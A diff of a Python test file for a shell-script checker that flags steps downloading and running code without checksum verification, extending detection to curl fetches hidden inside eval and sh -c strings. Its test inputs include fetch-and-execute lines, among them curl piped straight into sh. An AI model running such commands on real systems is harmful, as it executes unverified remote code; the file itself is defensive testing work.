@@ -769,14 +769,33 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                       ("check", 'echo "%s  /tmp/d/x.sh" | sha256sum -c -\n' % HEX),
                       ("run", "chmod +x /tmp/d/*.sh\n"))
 
-    # 6. a fetch inside an `eval` STRING (not a substitution).
+    # 6. a fetch inside an `eval` STRING (not a substitution). CLOSED: the
+    # string is shell, and this module reads shell -- the quotes are not a
+    # grammar it lacks, only one it was not looking through.
     def test_a_fetch_inside_an_eval_string(self):
-        self.accepted(("get", 'eval "curl -sfL https://example.test/p -o /tmp/p"\n'),
-                      ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+        self.flagged(("get", 'eval "curl -sfL https://example.test/p -o /tmp/p"\n'),
+                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))
 
     def test_a_fetch_inside_a_sh_dash_c_string(self):
-        self.accepted(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
-                      ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+        self.flagged(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
+                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+
+    def test_a_fetch_and_its_use_both_inside_the_string(self):
+        self.flagged(("run", 'eval "curl -sfL https://example.test/p -o /tmp/p; '
+                             'chmod +x /tmp/p"\n'))
+
+    def test_a_checksum_inside_the_string_still_clears_it(self):
+        # The expansion keeps the ORDER, so a step hardened inside its own
+        # quoted script is read as hardened rather than as unread.
+        self.accepted(("run", 'sh -c "curl -sfL https://example.test/p -o /tmp/p; '
+                              'echo %s  /tmp/p | sha256sum -c -; '
+                              'chmod +x /tmp/p"\n' % HEX))
+
+    def test_a_pipe_to_a_shell_inside_the_string_is_still_a_pipe_to_a_shell(self):
+        self.flagged(("run", 'eval "curl -sfL https://example.test/i.sh | sh"\n'))
+
+    def test_a_string_that_fetches_nothing_is_left_alone(self):
+        self.accepted(("run", 'sh -c "echo hello; /usr/bin/true"\n'))
 
     # 7. an executor that reads the file by convention, not by argument.
     def test_an_executor_that_reads_the_file_by_convention(self):
